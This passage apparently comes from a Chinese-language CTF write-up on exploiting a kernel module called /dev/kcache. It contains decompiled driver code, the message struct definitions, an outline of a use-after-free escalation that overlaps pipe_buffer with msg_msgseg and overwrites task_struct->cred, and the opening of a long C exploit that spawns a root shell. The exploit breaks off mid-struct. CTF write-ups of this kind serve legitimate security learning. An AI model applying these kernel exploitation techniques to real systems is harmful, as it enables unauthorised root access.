&amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span class="hljs-keyword">goto</span> LABEL_27;<br>        v4 = v3;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_encrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = (_DWORD)&amp;unk_10002;<br>          <span class="hljs-keyword">goto</span> LABEL_22;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        *(_WORD *)v11[<span class="hljs-number">0</span>] = <span class="hljs-number">2</span>;<br>        *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>        printk(&amp;unk_1808);<br>        <span class="hljs-keyword">goto</span> LABEL_33;<br>    &#125;<br>    kfree(v4);<br>LABEL_32:<br>    *(_WORD *)v0 = <span class="hljs-number">2</span>;<br>    *(_WORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-number">2</span>;<br>LABEL_33:<br>    kkk_write_k2u_queue(v0);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逆向分析我们不难获得 <code>u2k</code> 与 <code>k2u</code> 队列中的 object 的结构体定义：</p><blockquote><p><del>👴自己逆半天得的，没有偷偷看源码</del></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint32_t</span> status;<br>    <span class="hljs-type">uint64_t</span> tag;<br>    <span class="hljs-type">uint64_t</span> data_len;<br>    <span class="hljs-type">uint8_t</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>那么这个内核模块的全貌便已经展现在我们面前了：用户通过 <code>ioctl()</code> 向请求队列 <code>u2k</code> 中放入请求消息（每条消息附带一个 header），内核线程异步地从 <code>u2k</code> 队列中读取消息，根据其类型进行处理，完成之后将结果放回 <code>k2u</code> 队列，由用户进行异步读取；对于请求与响应消息长度相同的，内核会复用相应的 object，否则会分配新的 object 作为返回结果并释放储存原有请求信息的 object</p><p>严格意义上来说这道题其实没有完全完成，笔者原本想要写一个完整的用户与内核间的  <em>异步通信消息处理框架</em>  ，但是最后只完成了异步通信队列，没有完成基于内存共享的状态查询部分，不过我们仍能通过 <code>ioctl()</code> 直接读取的方式完成轮询，就是开销巨大：）</p><h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用 UAF 将 <code>pipe_buffer</code> 和 <code>msg_msgseg</code> 分配到一起，读写 pipe 使得其使用 <code>pipe_buffer[1]</code> 以避免 <code>msg_msgseg</code> 开头的 NULL 干扰，之后不断重分配 <code>msg_msgseg</code> 进行内存搜索找到当前进程的 <code>task_struct</code> 并将 <code>task_struct-&gt;cred</code> 改为 <code>init_cred</code> 即可完成提权</p><p>这里没有选择将两个 <code>pipe_buffer</code> 分配到同一个 object 的方式是因为<strong>题目开启了</strong> <code>CONFIG_INIT_ON_FREE_DEFAULT_ON</code> <strong>，所有的内核对象在释放后都会被清零</strong>，因此我们很难直接构造出 page-level UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * I - fundamental functions</span><br><span class="hljs-comment"> * e.g. CPU-core binder, user-status saver, etc.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">size_t</span> kernel_base = <span class="hljs-number">0xffffffff81000000</span>, kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> page_offset_base = <span class="hljs-number">0xffff888000000000</span>, vmemmap_base = <span class="hljs-number">0xffffea0000000000</span>;<br><span class="hljs-type">size_t</span> init_task, init_nsproxy, init_cred;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">direct_map_addr_to_page_addr</span><span class="hljs-params">(<span class="hljs-type">size_t</span> direct_map_addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> page_count;<br><br>    page_count = ((direct_map_addr &amp; (~<span class="hljs-number">0xfff</span>)) - page_offset_base) / <span class="hljs-number">0x1000</span>;<br>    <br>    <span class="hljs-keyword">return</span> vmemmap_base + page_count * <span class="hljs-number">0x40</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-comment">/* root checker and shell poper */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] checking for root...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-comment">/* userspace status saver */</span><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">int</span> (*confirm)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">void</span> (*release)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*try_steal)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>    <span class="hljs-type">int</span> (*get)(<span class="hljs-keyword">struct</span> pipe_inode_info *, <span class="hljs-keyword">struct</span> pipe_buffer *);<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">struct msgbuf &#123;</span><br><span class="hljs-comment">    long mtype;</span><br><span class="hljs-comment">    char mtext[0];</span><br><span class="hljs-comment">&#125;;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY        040000  <span class="hljs-comment">/* copy (not remove) all queue messages */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">build_msg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * II - interface to interact with /dev/kcache</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">int</span> dev_fd;<br><br><span class="hljs-comment">/* msg type */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REQUEST    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_REPLY      2</span><br><br><span class="hljs-comment">/* user to kernel request */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_ENCRYPT_TEA     1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_DECRYPT_TEA     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_HASH_MD5        3</span><br><br><span class="hljs-comment">/* msg status */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS      1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_FAIL         2</span><br><br><span class="hljs-comment">/* for ioctl */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RECV_MSG 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEND_MSG 0x1919810</span><br><br><span class="hljs-comment">/* message header */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span> type;<br>    <span class="hljs-type">uint16_t</span> cmd;<br>    <span class="hljs-type">uint16_t</span> status;    <span class="hljs-comment">/* for TYPE_REPLY only */</span><br>    <span class="hljs-type">size_t</span>  tag;        <span class="hljs-comment">/* for user to identify different message */</span><br>    <span class="hljs-type">size_t</span> data_len;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tea_crypt_info</span> &#123;</span><br>    <span 